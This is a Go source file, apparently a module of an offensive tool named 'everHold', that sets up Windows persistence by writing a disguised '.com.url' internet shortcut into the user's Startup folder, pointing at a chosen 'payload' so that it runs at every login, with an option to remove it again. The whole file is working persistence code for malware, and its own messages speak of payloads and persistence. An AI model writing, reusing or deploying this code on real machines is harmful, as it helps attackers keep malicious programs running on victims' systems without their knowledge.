package persist

import (
	"everHold/src/tools"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
)

type Payload struct {
	Path string
}

func getAppDataPath() (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}
	return filepath.Join(usr.HomeDir, "AppData", "Roaming"), nil
}

func getPayloadPath(payload string) (string, bool) {
	// Here you can add any logic to validate or manipulate the payload path
	if _, err := os.Stat(payload); err == nil {
		return payload, true
	}
	return "", false
}

func persistStartup(payload string, name string, add bool) bool {
	appdata, err := getAppDataPath()
	if err != nil {
		tools.PrintError("Failed to get AppData path: " + err.Error())
		return false
	}

	startupDir := filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if _, err := os.Stat(startupDir); os.IsNotExist(err) {
		tools.PrintError("Startup directory not found: " + startupDir)
		return false
	}

	startupFilePath := filepath.Join(startupDir, fmt.Sprintf("%s.com.url", name))
	if add {
		payloadPath, valid := getPayloadPath(payload)
		if valid {
			file, err := os.Create(startupFilePath)
			if err != nil {
				tools.PrintError("Failed to create startup file: " + err.Error())
				return false
			}
			defer file.Close()
			_, err = file.WriteString(fmt.Sprintf("\n[InternetShortcut]\nURL=file:///%s\n", payloadPath))
			if err != nil {
				tools.PrintError("Failed to write to startup file: " + err.Error())
				return false
			}
			tools.PrintSuccess("Startup file created: " + startupFilePath)
			tools.PrintSuccess("payload will run when restart ")
			return true
		} else {
			tools.PrintError("Cannot proceed, invalid payload")
			return false
		}
	} else {
		tools.PrintInfo("Removing startup file (" + startupFilePath + ")")
		err := os.Remove(startupFilePath)
		if err != nil {
			tools.PrintError("Unable to remove persistence: " + err.Error())
			return false
		}
		tools.PrintSuccess("Successfully removed persistence")
		return true
	}
}

func CallpersistStartup(payload string, add bool, name string) bool {
	success := persistStartup(payload, name, add)
	return success
}
